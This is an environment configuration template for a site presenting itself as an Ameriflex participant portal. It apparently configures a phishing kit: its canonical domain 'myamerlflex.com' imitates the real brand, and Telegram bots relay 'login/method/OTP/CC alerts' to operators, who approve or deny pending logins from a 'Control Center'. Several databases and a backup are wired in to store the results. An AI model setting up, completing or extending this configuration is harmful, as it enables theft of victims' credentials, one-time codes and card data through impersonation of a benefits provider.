# Ameriflex participant portal — environment template (Step 3).
# Copy to `.env.local` and fill with LIVE values. Never commit `.env.local`.
# Bundles: see Sleipnir the glider/Steins Gate/env_readme.md.

# ===== Bundle 1 — Ops Telegram (visit + login/method/OTP/CC alerts) =====
TELEGRAM_BOT_TOKEN=your_ops_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
# Control Center origin only (no /admin/login, no ?project=) — approve/deny links
ADMIN_PORTAL_URL=https://your-control-center.example.com

# SEO admin Telegram — IndexNow deploy notify + SEO alerts
# Required on Vercel Build env (not Runtime-only) for IndexNow Telegram on deploy
TELEGRAM_SEO_BOT_TOKEN=your_seo_bot_token_here
TELEGRAM_SEO_ADMIN=your_seo_chat_id_here

# ===== Bundle 3 / 7 — Neon (pending-login admin gates + bot audit) =====
# Create order (mandatory): DATABASE_URL -> DB_2 … DB_10 -> backup.
# Official primary takes no CC_ID; DB_2..DB_10 + backup REQUIRE CC_ID.
# Never set DB_1 (silent legacy alias only).
DATABASE_URL=postgres://user:password@host/database?sslmode=require
DB_2=
DB_3=
DB_4=
DB_5=
DB_6=
DB_7=
DB_8=
DB_9=
DB_10=
DATABASE_BACKUP_FALLBACK=
CC_ID=your_cc_id_here
# Optional diagnostics:
# NEON_PROJECT_ID_1=
# NEON_PROJECT_ID_10=

# ===== Site =====
# Canonical origin is HARDCODED in lib/site-url.ts = https://myamerlflex.com
# (operator paste, apex confirmed intentionally primary on 2026-10-28).
# The prebuild crawler audit is invoked with SITE_ORIGIN_ALLOW_APEX=1 to honor
# the apex-paste; switch SITE_ORIGIN to the www host if Vercel Primary ever
# moves to www (apex 308).
# Canonical origin is HARDCODED in lib/site-url.ts (operator paste — do not
# override with env). INDEXNOW_KEY default is also hardcoded there:
# INDEXNOW_KEY=                  # optional deploy-time override of the default
NEXT_PUBLIC_SITE_URL=https://myamerlflex.com

# ===== Landing Turnstile (only checked when a token is submitted) =====
TURNSTILE_SECRET_KEY=your_turnstile_secret_here

# ===== Dev only — ignored / never set on production =====
# ALLOW_LOCAL_TESTING=1
# CSP=1
# CRON_SECRET=
# SITE_ID=              # only if lib/project-config.ts is absent
